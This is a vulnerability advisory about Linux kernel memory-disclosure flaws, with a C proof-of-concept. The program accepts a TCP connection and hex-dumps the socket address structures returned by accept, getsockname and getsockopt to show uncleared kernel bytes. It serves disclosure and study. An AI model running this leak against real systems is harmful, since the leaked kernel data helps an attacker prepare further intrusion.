source: http://www.securityfocus.com/bid/17203/info

The Linux kernel is affected by local memory-disclosure vulnerabilities. These issues are due to the kernel's failure to properly clear previously used kernel memory before returning it to local users.

These issues allow an attacker to read kernel memory and potentially gather information to use in further attacks.

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <linux/netfilter_ipv4.h>

void
dump(const unsigned char *p, unsigned l)
{
  printf("data:");
  while (l > 0) {
    printf(" %02x", *p);
    ++p; --l;
  }
  printf("\n");
}

int
main(int argc, char **argv)
{
  int port;
  int ls, as, r, one;
  struct sockaddr_in sa;
  socklen_t sl;

  if (argc != 2 || (port = atoi(argv[1])) == 0) {
    fprintf(stderr, "usage: bug PORT\n");
    return (1);
  }

  ls = socket(PF_INET, SOCK_STREAM, 0);
  if (ls == -1) {
    perror("ls = socket");
    return (1);
  }
  one = 1;
  r = setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
  if (r == -1) {
    perror("setsockopt(ls)");
    return (1);
  }
  sa.sin_family = PF_INET;
  sa.sin_addr.s_addr = INADDR_ANY;
  sa.sin_port = htons(port);
  r = bind(ls, (struct sockaddr *) &sa, sizeof(sa));
  if (r == -1) {
    perror("bind(ls)");
    return (1);
  }
  r = listen(ls, 1);
  if (r == -1) {
    perror("listen(ls)");
    return (1);
  }

  sl = sizeof(sa);
  as = accept(ls, (struct sockaddr *) &sa, &sl);
  if (as == -1) {
    perror("accept(ls)");
    return (1);
  }
  dump((unsigned char *) &sa, sizeof(sa));

  sl = sizeof(sa);
  r = getsockname(as, (struct sockaddr *) &sa, &sl);
  if (r == -1) {
    perror("getsockname(as)");
    return (1);
  }
  dump((unsigned char *) &sa, sizeof(sa));

  sl = sizeof(sa);
  r = getsockopt(as, SOL_IP, SO_ORIGINAL_DST, (struct sockaddr *) &sa, &sl);
  if (r == -1) {
    perror("getsockname(as)");
    return (1);
  }
  dump((unsigned char *) &sa, sizeof(sa));

  return (0);
}
